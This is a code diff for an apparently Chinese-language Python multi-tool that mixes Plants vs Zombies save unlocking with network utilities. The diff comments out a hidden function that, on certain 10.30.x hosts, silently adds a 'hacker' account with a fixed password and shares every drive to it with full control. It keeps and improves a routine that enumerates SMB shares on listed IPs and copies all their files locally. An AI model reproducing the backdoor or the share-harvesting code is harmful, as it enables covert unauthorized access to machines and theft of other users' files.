@@ -7,20 +7,20 @@ from smbprotocol.open import Open
 from tqdm import tqdm
 
 from all import *
-from exe import jiyu, files, page, zajiaofuzhu
+from exe import jiyu, filess, page, zajiaofuzhu
 
 
-def ma_1():
-    hostname = socket.gethostname()  # 获取本机所有IP地址
-    ip_addresses = socket.gethostbyname_ex(hostname)[2]
-    ip_list = []
-    for ip in ip_addresses:  # 打印所有IP地址
-        ip_list.append(ip)
-    if len(ip_list) == 1 and ip_list[0].startswith("10.30"):
-        subprocess.run("net user hacker QWERasdf1234 /add", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        for letter in string.ascii_uppercase:
-            command = f'net share {letter}={letter}:\\ /grant:hacker,full'
-            subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+# def ma_1():
+#     hostname = socket.gethostname()  # 获取本机所有IP地址
+#     ip_addresses = socket.gethostbyname_ex(hostname)[2]
+#     ip_list = []
+#     for ip in ip_addresses:  # 打印所有IP地址
+#         ip_list.append(ip)
+#     if len(ip_list) == 1 and ip_list[0].startswith("10.30"):
+#         subprocess.run("net user hacker QWERasdf1234 /add", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+#         for letter in string.ascii_uppercase:
+#             command = f'net share {letter}={letter}:\\ /grant:hacker,full'
+#             subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 def exe_1(choice):
     # C:\ProgramData\PopCap Games\PlantsVsZombies\pvzHE\yourdata
@@ -40,7 +40,7 @@ def exe_1(choice):
             os.makedirs(zajiao_target_dir, exist_ok=True)
             # 复制文件
             try:
-                files.zajiao_get_users_dat()
+                filess.zajiao_get_users_dat()
                 print(rgb_len("red", "成功导入全解锁存档！！！"))
             except:
                 print(rgb_len("red", "导入全解锁存档失败！！！"))
@@ -118,7 +118,7 @@ def exe_1(choice):
             os.makedirs(weihua_target_dir, exist_ok=True)
             # 复制文件
             try:
-                files.weihua_get_users_dat()
+                filess.weihua_get_users_dat()
                 print(rgb_len("red", "成功导入全解锁存档！！！"))
             except:
                 print(rgb_len("red", "导入全解锁存档失败！！！"))
@@ -238,7 +238,7 @@ def exe_3(choice):
             print(rgb_len("red", "出现错误或者人为希望退出这个程序"))
     elif choice == "2":
         clear_console()
-        print(rgb_len("red", files.get_port_info()))
+        print(rgb_len("red", filess.get_port_info()))
     elif choice == "3":
         clear_console()
         def ping(ip):# 定义扫描函数
@@ -296,43 +296,53 @@ def exe_3(choice):
             print(rgb_len("red", "扫描出错！！！"))
     elif choice == "5":
         clear_console()
-        with open('D:/output.txt', 'r') as file:  # 读取output.txt中的IP地址
+        # 读取output.txt中的IP地址
+        with open('D:/output.txt', 'r') as file:
             ip_addresses = file.read().splitlines()
-        shared_folder_path = 'D:/共享文件夹'  # 创建共享文件夹
+
+        # 创建共享文件夹
+        shared_folder_path = 'D:/共享文件夹'
         os.makedirs(shared_folder_path, exist_ok=True)
-        for ip in ip_addresses:  # 遍历IP地址并列出共享文件夹
+
+        # 遍历IP地址并列出共享文件夹
+        for ip in ip_addresses:
             try:
+                # 使用net view命令列出共享文件夹
                 result = subprocess.run(['net', 'view', f'\\\\{ip}'], capture_output=True, text=True)
                 if result.returncode == 0:
                     shared_folders = []
                     lines = result.stdout.splitlines()
                     for line in lines:
-                        parts = line.split()
-                        if parts:
-                            shared_folders.append(parts[0])
-                    for folder in shared_folders:  # 复制文件到相应的文件夹
+                        if line and not line.startswith('共享名') and not line.startswith(
+                                '命令成功完成') and not line.startswith('在') and not line.startswith('---'):
+                            parts = line.split()
+                            if parts:
+                                shared_folders.append(parts[0])
+                    for folder in shared_folders:
                         source_folder = f'\\\\{ip}\\{folder}'
                         destination_folder = os.path.join(shared_folder_path, ip, folder)
                         os.makedirs(destination_folder, exist_ok=True)
-                        files_to_copy = []# 输出要复制的文件列表
-                        for root, dirs, files_f in os.walk(source_folder):
-                            for file in files_f:
-                                source_file = os.path.join(root, file)
-                                destination_file = os.path.join(destination_folder,os.path.relpath(source_file, source_folder))
-                                files_to_copy.append((source_file, destination_file))
-                        for source_file, destination_file in files_to_copy:# 复制文件
-                            try:
-                                print(rgb_len("yellow", f"正在复制 {source_file} 到 {destination_file}..."))
-                                shutil.copy2(source_file, destination_file)
-                                file_size = os.path.getsize(source_file)
-                                print(rgb_len("green",f"成功复制 {source_file} 到 {destination_file}，大小为 {file_size} 字节"))
-                            except Exception as e:
-                                print(rgb_len("red", f"复制 {source_file} 时出错: {e}"))
+                        try:
+                            # 获取要复制的文件总数
+                            total_files = sum([len(files) for r, d, files in os.walk(source_folder)])
+                            # 显示复制进度条
+                            with tqdm(total=total_files, desc=f"正在复制 {source_folder}") as pbar:
+                                for root, dirs, files in os.walk(source_folder):
+                                    for file in files:
+                                        src_file = os.path.join(root, file)
+                                        dst_file = os.path.join(destination_folder,
+                                                                os.path.relpath(src_file, source_folder))
+                                        os.makedirs(os.path.dirname(dst_file), exist_ok=True)
+                                        shutil.copy2(src_file, dst_file)
+                                        pbar.update(1)
+                                        pbar.refresh()  # 刷新进度条
+                            print(rgb_len("green", f"已复制 {source_folder} 到 {destination_folder}"))
+                        except Exception as e:
+                            print(rgb_len("red", f"复制 {source_folder} 时出错: {e}"))
                 else:
-                    print(rgb_len("red", f"无法访问 {ip} 的共享文件夹"))
+                    print(rgb_len("yellow", f"无法访问 {ip} 的共享文件夹"))
             except Exception as e:
                 print(rgb_len("red", f"处理 {ip} 时出错: {e}"))
-
     else:
         clear_console()
         print(rgb_len("red","请输入正确的选项！"))
